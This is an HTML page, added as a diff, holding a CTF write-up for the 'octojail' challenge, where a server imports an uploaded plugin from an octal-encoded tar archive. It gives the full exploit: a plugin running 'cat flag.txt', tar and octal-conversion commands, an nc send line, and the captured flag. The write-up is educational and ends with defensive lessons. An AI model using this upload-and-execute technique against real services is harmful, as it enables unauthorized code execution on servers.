@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup - Misc Challenge</title>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+        }
+        header {
+            background-color: #121212;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid #0d7377;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+            color: #0d7377;
+        }
+        .challenge-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .challenge-info div {
+            background-color: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+        .container {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #0d7377;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+        h3 {
+            color: #14ffec;
+            margin-top: 25px;
+        }
+        pre {
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            padding: 0;
+        }
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-radius: 5px;
+        }
+        .description {
+            background-color: #2a2a2a;
+            border-left: 4px solid #0d7377;
+            padding: 10px 20px;
+            margin: 20px 0;
+        }
+        .flag {
+            background-color: #1c3b1c;
+            color: #00ff7f;
+            padding: 10px 20px;
+            border-left: 4px solid #00ff7f;
+            margin: 20px 0;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+        .step {
+            margin-bottom: 30px;
+        }
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #14ffec;
+        }
+        ul {
+            padding-left: 20px;
+        }
+        ul li {
+            margin-bottom: 8px;
+        }
+        .references a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+        .references a:hover {
+            text-decoration: underline;
+            color: #0d7377;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+        .command {
+            background-color: #151515;
+            color: #14ffec;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-left: 4px solid #0d7377;
+        }
+        .output {
+            background-color: #1a1a1a;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ddd;
+        }
+        .highlight-section {
+            background-color: #1a1a1a;
+            border-left: 4px solid #14ffec;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 5px;
+        }
+        .key-point {
+            border-left: 3px solid #ff7e67;
+            padding-left: 15px;
+            margin: 15px 0;
+            background-color: rgba(255, 126, 103, 0.1);
+        }
+        .vulnerability {
+            background-color: #3d1a1a;
+            border-left: 4px solid #ff6b6b;
+            padding: 15px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🎯 Challenge: octojail</h1>
+        <div class="challenge-info">
+            <div>🏆 CTF@AC</div>
+            <div>📢 Category: Misc</div>
+            <div>💯 Points: 100</div>
+            <div>📊 Solves: 85</div>
+            <div>👤 Author: thek0der</div>
+            <div>👤 Solver: ArghgrA/CuboConNoveQuadrati</div>
+        </div>
+    </header>
+    <div class="container">
+        <h2>📝 Challenge Description & Summary</h2>
+        <div class="description">
+            <p>We only like octal around here!</p>
+        </div>
+        <p><strong>📁 Files:</strong> main.py</p>
+        <p><strong>🌐 Server:</strong> ctf.ac.upt.ro:9354</p>
+    </div>
+    <div class="container">
+        <h2>🔍 Server Analysis (Relevant Code)</h2>
+        <p>These are the key points of the server I analyzed:</p>
+        <pre><code class="language-python"># receives octal input line and converts it to bytes
+data = sys.stdin.readline().strip()
+blob = to_bytes_from_octal_triplets(data)
+
+# opens as tarfile from blob in memory and extracts to "uploads"
+with tarfile.open(fileobj=bio, mode="r:*") as tf:
+    os.makedirs("uploads", exist_ok=True)
+    safe_extract(tf, "uploads")
+
+# then looks for uploads/plugin.py or plugin.py and imports/executes it
+load_and_run_plugin()</code></pre>
+        <p>The safe_extract function filters members with:</p>
+        <div class="command">
+            not name.startswith("/") and not ".." in name
+        </div>
+        <p>So the server:</p>
+        <ul>
+            <li>Accepts a tar archive from bytes provided as input</li>
+            <li>Extracts files (with minimal protection against path traversal)</li>
+            <li>Imports/executes uploads/plugin.py by calling its run() if present</li>
+        </ul>
+        <div class="key-point">
+            <p>⚠️ The crucial point: the server executes arbitrary code (the extracted plugin's run()) without any sandbox or control over the module's behavior. This is the exploited vulnerability.</p>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🚨 Vulnerability Analysis</h2>
+        <div class="vulnerability">
+            <h3>🔓 Untrusted Code Execution</h3>
+            <p>The server extracts user-sent files and imports/executes an arbitrary module (plugin.run()), allowing command execution on the server.</p>
+        </div>
+        <ul>
+            <li><strong>safe_extract</strong> provides minimal verification (blocks names starting with / or containing ..) but doesn't prevent valid files from being placed in uploads/ and then imported</li>
+            <li>No restrictions on importable code (no checks on modules, permissions, sandboxing, separate user, etc.)</li>
+            <li>Although there's a timeout (6-second alarm), it's not sufficient mitigation to prevent reading local files like flag.txt</li>
+        </ul>
+    </div>
+    <div class="container">
+        <h2>🛠️ Exploitation Strategy</h2>
+        <div class="step">
+            <h3>💡 Exploitation Idea</h3>
+            <ol>
+                <li>Create plugin.py with a run() function that opens/reads /app/flag.txt (or flag.txt in working directory) and prints the content</li>
+                <li>Put uploads/plugin.py in a tar archive (server extracts files to uploads, so placing the file with that path is appropriate)</li>
+                <li>Convert the tar bytes to an octal triplet string (format required by server)</li>
+                <li>Send that string as input to the server (single line)</li>
+                <li>Server will extract, import the plugin, and execute run() printing the flag</li>
+            </ol>
+        </div>
+        <div class="step">
+            <h3>🔧 Step 1: Create Malicious Plugin</h3>
+            <p>Create plugin.py with the following content:</p>
+            <pre><code class="language-python"># plugin.py
+def run():
+    import subprocess
+    import os
+    result = subprocess.run(['cat', 'flag.txt'], capture_output=True, text=True, timeout=3)
+    if result.stdout:
+        print(result.stdout)</code></pre>
+            <div class="highlight-section">
+                <p>💡 <strong>Key Insight:</strong> The plugin uses subprocess to execute 'cat flag.txt' and captures the output, then prints it to stdout where the server will display it.</p>
+            </div>
+        </div>
+        <div class="step">
+            <h3>📦 Step 2: Prepare Tar Archive</h3>
+            <p>Create the tar archive with the correct path structure:</p>
+            <div class="command">
+                mkdir -p tmp/uploads<br>
+                cp plugin.py tmp/uploads/<br>
+                tar -C tmp -cf payload.tar uploads/plugin.py
+            </div>
+        </div>
+        <div class="step">
+            <h3>🔢 Step 3: Convert to Octal Triplets</h3>
+            <p>Convert the tar file to octal triplet format:</p>
+            <pre><code class="language-python">python3 - <<'PY' > payload.octal
+b = open('payload.tar','rb').read()
+print(''.join(f'{x:03o}' for x in b))
+PY</code></pre>
+            <p>The payload.octal file now contains the long line of octal digits to send to the server.</p>
+        </div>
+        <div class="step">
+            <h3>📤 Step 4: Send Payload</h3>
+            <p>Send the octal string to the server:</p>
+            <div class="command">
+                nc challenge.server 1234 < payload.octal
+            </div>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🎯 Execution Results</h2>
+        <p>Upon sending, the server responded with:</p>
+        <div class="output">
+/app/server_hard.py:22: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives...
+  tf.extract(m, path)
+Send octal
+ctf{0331641fadb35abb1eb5a9640fa6156798cba4538148ceb863dfb1821ac69000}
+        </div>
+        <div class="flag">
+            ctf{0331641fadb35abb1eb5a9640fa6156798cba4538148ceb863dfb1821ac69000}
+        </div>
+    </div>
+    <div class="container">
+        <h2>📚 Lessons Learned</h2>
+        <ul>
+            <li>Server-side code execution vulnerabilities can arise from importing and executing untrusted user-provided modules</li>
+            <li>Path traversal protection alone is insufficient if the application still executes uploaded code</li>
+            <li>Octal encoding is a simple obfuscation technique that doesn't provide security against malicious payloads</li>
+            <li>Timeouts are not effective mitigation against file reading attacks</li>
+            <li>Proper sandboxing, input validation, and execution restrictions are essential when handling user uploads</li>
+            <li>The combination of file upload and code execution creates a powerful attack vector</li>
+        </ul>
+    </div>
+    <div class="container references">
+        <h2>🔗 References</h2>
+        <ul>
+            <li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">OWASP: Unrestricted File Upload</a></li>
+        </ul>
+    </div>
+    <div class="footer">
+        <p>🏆 © 2025 - Writeup created by ArghgrA/CuboConNoveQuadrati | Happy hacking! 🔍</p>
+    </div>
+</body>
+</html>
